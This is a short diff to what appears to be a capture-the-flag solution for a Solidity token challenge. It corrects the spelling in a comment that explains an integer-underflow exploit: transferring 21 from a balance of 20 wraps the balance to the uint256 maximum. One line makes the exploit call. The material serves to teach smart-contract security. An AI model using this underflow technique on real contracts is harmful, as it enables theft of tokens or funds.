@@ -5,5 +5,5 @@
 // solution
 
 // you start with a balance of 20, so you transfer 21 to any other account
-// then when the contract substract 21 to your balance, causes an undeflow that results in the maximum value of an uint256 variable
+// then when the contract substract 21 to your balance, it will cause an underflow that results in the maximum value of an uint256 variable
 await contract.transfer('0xb4B3CCc397D3E5A5E6f7990BEc16bbe5b4036Db2', 21);
